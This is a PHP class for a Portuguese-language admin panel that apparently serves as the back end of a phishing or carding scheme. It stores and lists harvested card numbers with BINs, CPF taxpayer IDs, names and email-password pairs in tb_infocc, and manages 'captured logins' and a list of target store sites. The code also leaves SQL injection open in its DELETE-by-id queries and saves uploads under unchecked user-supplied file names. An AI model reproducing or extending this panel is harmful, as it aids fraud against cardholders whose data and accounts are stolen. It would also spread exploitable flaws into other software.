 <?php 

class Painel{


	public static function logado(){
		return isset($_SESSION['login']) ? true : false;
	}

	public static function logout(){
		session_destroy();
		header('Location: '.INCLUDE_PATH_PAINEL);
	}


	public static function carregarPagina(){
		if(isset($_GET['url'])){
			$url = explode('/',$_GET['url']);
			if(file_exists('pages/'.$url[0].'.php')){
				include('pages/'.$url[0].'.php');
			}else{
					//Página não existe!
				header("Location: ".INCLUDE_PATH_PAINEL);
			}
		}else{
			include('pages/home.php');
		}
	}


	public static function listarUsuariosOnline(){
		//limpa os usuarios inativos mais de 1 minuto.
		self::limparUsuariosOnline();
		$sql = Banco::conectar()->prepare("SELECT * FROM tb_admin_online");
		$sql->execute();
		return $sql->fetchAll();

	}

	public static function limparUsuariosOnline(){
		$date = date('Y-m-d H:i:s');
		$sql = Banco::conectar()->exec("DELETE FROM tb_admin_online WHERE ultima_acao < '$date' - INTERVAL 1 MINUTE");
	}


	public static function alerta($tipo, $mensagem){
		if($tipo == 'sucesso'){
			echo '<div class="sucesso"><i class="fa fa-check-circle"></i>  '.$mensagem.'</div>';
		}elseif($tipo == 'erro'){
			echo '<div class="erro"><i class="fa fa-times"></i>  '.$mensagem.'</div>';
		}
	}

	public static function validaImagem($imagem){
		if($imagem['type'] == 'image/jpeg' || $imagem['type'] == 'image/jpg' || $imagem['type'] == 'image/png'){
			$tamanho = intval($imagem['size']/1024);
			if($tamanho < 300){
				return true;
			}
		}else{
			return false;
		}
	}

	public static function uploadFile($file){
		if(move_uploaded_file($file['tmp_name'], BASE_DIR_PAINEL.'uploads/'.$file['name'])){
			return $file['name'];
		}else{
			return false;
		}
	}

	public static function deleteFile($file){
		@unlink(BASE_DIR_PAINEL.'/uploads/'.$file);
	}


	public static function getInfo(){
		$sql = Banco::conectar()->prepare("SELECT * FROM tb_infocc");
		$sql->execute();
		if($sql->rowCount()>0){
			$data = $sql->fetchAll();
			return $data;
		}
	}
	
	public static function getInfoCartx(){
		$sql = Banco::conectar()->prepare("SELECT * FROM tb_info_cartx");
		$sql->execute();
		if($sql->rowCount()>0){
			$data = $sql->fetchAll();
			return $data;
		}
	}

	public static function delete($id){
		return $sql = Banco::conectar()->query("DELETE FROM tb_infocc WHERE id = $id");
	}
	public static function deleteAll(){
		 $sql = Banco::conectar()->query("DELETE FROM tb_infocc");
		 return  $sql->execute();
	}
	
	public static function deleteCartx($id){
		return $sql = Banco::conectar()->query("DELETE FROM tb_info_cartx WHERE id = $id");
	}

	public  function cadastrarLoja($nome, $site){
		if(isset($nome, $site)){

			$sql = Banco::conectar()->prepare("INSERT INTO tb_admin_sites VALUES (null,?,?,?)");
			$sql->execute(array($nome, $site,date('Y-m-d H:i:s')));

			//$sql->execute(array($nome, $site, date('Y-m-d')));
			if($sql->rowCount() > 0){
				return true;
			}else{
				return false;
			}
		}

		
	}
//Listagem e deletagem de lojas
	public function getListarLoja(){
		$sql = Banco::conectar()->prepare("SELECT * FROM tb_admin_sites");
		$sql->execute();

		if($sql->rowCount()>0){
			$sites = $sql->fetchAll();
			return $sites;
		}	
	}

	public  function deletarLoja($id){
		return $sql = Banco::conectar()->query("DELETE FROM tb_admin_sites WHERE id = $id");
	}

	//listagem e deletagem de logins;
	public function getListarLogin(){
		$sql = Banco::conectar()->prepare("SELECT * FROM tb_admin_capture_logins");
		$sql->execute();

		if($sql->rowCount()>0){
			$logins = $sql->fetchAll();
			return $logins;
		}	
	}

	public  function deletarLogin($id){
		return $sql = Banco::conectar()->query("DELETE FROM tb_admin_capture_logins WHERE id = $id");
	}

	//Inserção na tabela CC's
	public static function insertInfo($site, $cpf, $nome, $cc, $emailsenha, $bin){
		$datahoje = date('d-m-Y H:i:s');

		if(!empty($cc)){
			$query = Banco::conectar()->prepare("SELECT * FROM tb_infocc WHERE cc = :cc");
			$query->bindValue(':cc', $cc);
			$query->execute();

			if($query->rowCount()>0){
				return false;
			}else{
				$sql = "INSERT INTO tb_infocc (site, cpf, nome, cc, emailsenha, bin, data_atual) VALUES (:site, :ssn, :nome, :cc, :emailsenha, :bin, :data_atual)";
				$sql = Banco::conectar()->prepare($sql);
				$sql->bindValue(':site', $site);
				$sql->bindValue(':ssn', $cpf);
				$sql->bindValue(':nome', $nome);
				$sql->bindValue(':cc', $cc);
				$sql->bindValue(':bin', $bin);
				$sql->bindValue(':emailsenha', $emailsenha);
				$sql->bindValue(':data_atual', $datahoje);
				$sql->execute();
			}
		}
	}

	public static function insertLogin(){

	}



}



?>